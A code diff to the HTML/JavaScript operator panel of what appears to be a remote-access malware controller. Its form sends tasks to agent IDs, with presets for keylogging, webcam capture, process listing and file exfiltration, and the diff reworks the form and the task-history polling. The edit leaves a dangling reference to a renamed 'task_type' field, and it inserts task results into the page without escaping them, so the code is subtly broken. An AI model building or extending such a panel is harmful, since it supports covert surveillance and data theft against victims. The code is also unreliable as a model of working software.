@@ -240,6 +240,9 @@
         <div class="card">
             <h2>Send Task to Agent</h2>
             
+            <div id="statusMessage" style="display: none; margin-bottom: 20px; padding: 10px; border-radius: 4px;">
+            </div>
+            
             <div class="predefined-tasks">
                 <button class="task-button" onclick="selectTask('keylogger')">
                     ⌨️ Keylogger
@@ -254,7 +257,7 @@
                     <small style="display: block">Capture webcam image</small>
                 </button>
                 <button class="task-button" onclick="selectTask('process_list')">
-                    📊 Process List
+                    📋 Process List
                     <small style="display: block">List running processes</small>
                 </button>
                 <button class="task-button" onclick="selectTask('file_exfil')">
@@ -267,29 +270,26 @@
                 </button>
             </div>
 
-            <form id="taskForm" onsubmit="return sendTask(event)">
+            <form id="taskForm" onsubmit="sendTask(event)">
                 <div class="form-group">
                     <label for="agent_id">Agent ID:</label>
                     <input type="text" id="agent_id" name="agent_id" required>
                 </div>
-
                 <div class="form-group">
-                    <label for="task_type">Task Type:</label>
-                    <input type="text" id="task_type" name="task_type" required>
+                    <label for="task">Task Type:</label>
+                    <input type="text" id="task" name="task" required>
                 </div>
-
                 <div class="form-group" id="customParamsGroup" style="display: none;">
                     <label for="task_params">Task Parameters (JSON):</label>
                     <textarea id="task_params" name="task_params" placeholder="{ &quot;param1&quot;: &quot;value1&quot; }"></textarea>
                 </div>
-
-                <button type="submit" id="submitBtn">Send Task</button>
+                <button type="submit" id="sendTaskBtn">Send Task</button>
             </form>
         </div>
 
-        <div class="card task-history">
+        <div class="card">
             <h2>Task History</h2>
-            <div id="taskHistory">Loading task history...</div>
+            <div id="taskHistory"></div>
         </div>
     </div>
 
@@ -305,12 +305,13 @@
         // Initialize theme
         document.body.setAttribute('data-theme', localStorage.getItem('theme') || 'light');
 
-        // Task selection
         function selectTask(taskType) {
-            // Remove selection from all buttons
-            document.querySelectorAll('.task-button').forEach(btn => btn.classList.remove('selected'));
+            document.getElementById('task').value = taskType;
             
-            // Add selection to clicked button
+            // Update UI to show selected task
+            document.querySelectorAll('.task-button').forEach(btn => {
+                btn.classList.remove('selected');
+            });
             event.target.closest('.task-button').classList.add('selected');
             
             const taskInput = document.getElementById('task_type');
@@ -331,94 +332,87 @@
             }
         }
 
-        // Send task
+        function showStatus(message, type) {
+            const statusDiv = document.getElementById('statusMessage');
+            statusDiv.style.display = 'block';
+            statusDiv.style.backgroundColor = type === 'error' ? 'var(--danger)' : 'var(--success)';
+            statusDiv.style.color = '#fff';
+            statusDiv.textContent = message;
+            
+            // Auto-hide after 5 seconds
+            setTimeout(() => {
+                statusDiv.style.display = 'none';
+            }, 5000);
+        }
+
         async function sendTask(event) {
             event.preventDefault();
-            const submitBtn = document.getElementById('submitBtn');
+            const form = event.target;
+            const submitBtn = form.querySelector('button[type="submit"]');
             submitBtn.disabled = true;
-            submitBtn.textContent = 'Sending...';
 
             try {
-                const formData = {
-                    agent_id: document.getElementById('agent_id').value,
-                    task_type: document.getElementById('task_type').value,
-                };
-
-                // Add parameters if present
-                const params = document.getElementById('task_params').value;
-                if (params) {
-                    try {
-                        formData.parameters = JSON.parse(params);
-                    } catch (e) {
-                        alert('Invalid JSON in parameters field');
-                        submitBtn.disabled = false;
-                        submitBtn.textContent = 'Send Task';
-                        return;
-                    }
-                }
-
-                const response = await fetch('/api/tasks', {
+                const formData = new FormData(form);
+                const response = await fetch('/send_task', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(formData),
+                    body: formData
                 });
 
                 const result = await response.json();
-
-                if (response.ok) {
-                    alert('Task sent successfully!');
-                    document.getElementById('taskForm').reset();
-                    fetchTaskHistory();
+                
+                if (result.status === 'sent') {
+                    showStatus(`Task sent successfully! Task ID: ${result.task_id}`, 'success');
+                    form.reset();
+                    document.querySelectorAll('.task-button').forEach(btn => {
+                        btn.classList.remove('selected');
+                    });
+                    await updateTaskHistory();
                 } else {
-                    throw new Error(result.error || 'Failed to send task');
+                    showStatus(`Error: ${result.message}`, 'error');
                 }
             } catch (error) {
-                alert('Error: ' + error.message);
+                showStatus(`Error: ${error.message}`, 'error');
             } finally {
                 submitBtn.disabled = false;
-                submitBtn.textContent = 'Send Task';
             }
         }
 
-        // Fetch task history
-        async function fetchTaskHistory() {
+        async function updateTaskHistory() {
+            const historyDiv = document.getElementById('taskHistory');
             try {
-                const response = await fetch('/api/tasks/history');
-                const tasks = await response.json();
-                
-                const container = document.getElementById('taskHistory');
-                if (tasks.length === 0) {
-                    container.innerHTML = '<p>No tasks in history.</p>';
-                    return;
-                }
+                const agentId = document.getElementById('agent_id').value;
+                if (!agentId) return;
 
-                container.innerHTML = tasks.map(task => `
-                    <div class="task-item">
-                        <strong>Agent ID:</strong> ${task.agent_id}
-                        <span class="status ${task.status.toLowerCase()}">${task.status}</span><br>
-                        <strong>Task Type:</strong> ${task.task_type}<br>
-                        <strong>Timestamp:</strong> ${new Date(task.timestamp).toLocaleString()}<br>
-                        ${task.result ? `
-                            <div class="task-result">
-                                <strong>Result:</strong><br>
-                                <pre>${typeof task.result === 'string' ? task.result : JSON.stringify(task.result, null, 2)}</pre>
-                            </div>
-                        ` : ''}
-                    </div>
-                `).join('');
+                const response = await fetch(`/api/tasks/${agentId}`);
+                const tasks = await response.json();
+
+                historyDiv.innerHTML = tasks.length ? '' : '<p>No tasks found for this agent.</p>';
+                
+                tasks.reverse().forEach(task => {
+                    const taskDiv = document.createElement('div');
+                    taskDiv.className = 'task-item';
+                    taskDiv.innerHTML = `
+                        <strong>Task ID:</strong> ${task.id}
+                        <span class="status ${task.status}">${task.status}</span><br>
+                        <strong>Type:</strong> ${task.type}<br>
+                        <strong>Time:</strong> ${new Date(task.timestamp).toLocaleString()}<br>
+                        ${task.result ? `<div class="task-result">${task.result}</div>` : ''}
+                    `;
+                    historyDiv.appendChild(taskDiv);
+                });
             } catch (error) {
-                document.getElementById('taskHistory').innerHTML = '<p style="color: var(--danger)">Failed to load task history.</p>';
-                console.error(error);
+                console.error('Error fetching task history:', error);
             }
         }
 
-        // Initial load
-        fetchTaskHistory();
+        // Update task history when agent ID changes
+        document.getElementById('agent_id').addEventListener('change', updateTaskHistory);
         
-        // Refresh task history periodically
-        setInterval(fetchTaskHistory, 10000);
+        // Initial task history update
+        updateTaskHistory();
+        
+        // Periodic updates
+        setInterval(updateTaskHistory, 5000);
     </script>
 </body>
 </html>
